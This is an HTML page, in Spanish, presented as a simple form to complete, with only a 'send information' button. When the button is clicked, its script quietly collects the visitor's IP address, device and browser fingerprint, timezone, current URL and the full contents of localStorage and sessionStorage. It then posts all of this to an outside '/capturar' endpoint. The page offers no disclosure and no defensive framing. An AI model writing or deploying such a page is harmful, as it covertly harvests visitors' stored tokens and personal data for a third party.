<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Completar Formulario</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
            width: 100%;
            max-width: 500px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Completar Formulario</h1>
        <form id="form">
            <button type="button" onclick="enviarDatos()">Enviar Información</button>
        </form>
    </div>

    <script>
        async function enviarDatos() {
            // Obtener dirección IP pública
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();

            // Información del dispositivo
            const infoDispositivo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                lenguaje: navigator.language,
                idiomas: navigator.languages.join(', '),
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                onlineStatus: navigator.onLine
            };

            // Información de la pantalla
            const infoPantalla = {
                resolucion: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth
            };

            // Información de la conexión
            let infoRed = { downlink: null, effectiveType: null };
            if (navigator.connection) {
                infoRed = {
                    downlink: navigator.connection.downlink,
                    effectiveType: navigator.connection.effectiveType
                };
            }

            // Zona horaria y fecha/hora local
            const infoTiempo = {
                fechaLocal: new Date().toString(),
                zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // Obtener URL actual
            const currentUrl = window.location.href;

            // Información de almacenamiento
            const localStorageData = getStorageData(localStorage);
            const sessionStorageData = getStorageData(sessionStorage);

            // Información de fuentes
            const fonts = document.fonts;

            // Enviar datos al servidor
            const datosRecopilados = {
                ip: ipData.ip,
                dispositivo: infoDispositivo,
                pantalla: infoPantalla,
                red: infoRed,
                tiempo: infoTiempo,
                url: currentUrl,
                localStorage: localStorageData,
                sessionStorage: sessionStorageData,
                fonts: fonts
            };

            fetch('https://site-production-e3f3.up.railway.app/capturar', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(datosRecopilados)
            }).then(response => {
                if (response.ok) {
                    alert('Información enviada con éxito');
                } else {
                    alert('Error al enviar la información');
                }
            }).catch(error => {
                console.error('Error al conectar con el servidor:', error);
            });
        }

        // Función para capturar datos del almacenamiento
        function getStorageData(storage) {
            const data = {};
            for (let i = 0; i < storage.length; i++) {
                const key = storage.key(i);
                const value = storage.getItem(key);
                data[key] = value;
            }
            return data;
        }
    </script>
</body>
</html>
